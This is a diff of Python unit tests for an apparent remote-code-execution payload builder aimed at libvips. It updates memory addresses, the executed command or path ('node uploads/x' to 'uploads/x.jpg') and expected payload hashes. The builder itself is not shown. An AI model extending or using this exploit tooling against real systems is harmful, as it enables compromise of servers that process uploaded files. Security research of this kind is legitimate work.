@@ -9,18 +9,18 @@ from stack_profile import load_profile
 
 
 class PayloadProfileTests(unittest.TestCase):
-    def test_profile_payload_matches_libvips_spawn_layout(self) -> None:
+    def test_profile_payload_matches_libvips_gmodule_layout(self) -> None:
         payload = build_rce_payload(
             0x0000700000000000,
             0x5970,
-            0x0000700000349A13,
-            "node uploads/x",
+            0x00007000003E995E,
+            "uploads/x.jpg",
             load_profile(),
         )
         self.assertEqual(len(payload), 4096)
         self.assertEqual(
             hashlib.sha256(payload).hexdigest(),
-            "4c35085bc0d7938996b53008796dac9291b3b0526ba15571e133b90f34c40a87",
+            "1c1899747e45e53fb60117cfca722bee63f37604e24a3a623852bdad8a480a74",
         )
 
     def test_unaligned_libvips_base_is_rejected(self) -> None:
@@ -28,7 +28,7 @@ class PayloadProfileTests(unittest.TestCase):
             build_rce_payload(
                 0x0000700000000001,
                 0x5970,
-                0x0000700000349A14,
+                0x00007000003E995F,
                 profile=load_profile(),
             )
 
@@ -37,7 +37,7 @@ class PayloadProfileTests(unittest.TestCase):
             build_rce_payload(
                 0x0000700000000000,
                 0x10000,
-                0x0000700000349A13,
+                0x00007000003E995E,
                 profile=load_profile(),
             )
 
@@ -46,7 +46,7 @@ class PayloadProfileTests(unittest.TestCase):
             build_rce_payload(
                 0x0000700000000000,
                 -1,
-                0x0000700000349A13,
+                0x00007000003E995E,
                 profile=load_profile(),
             )
 
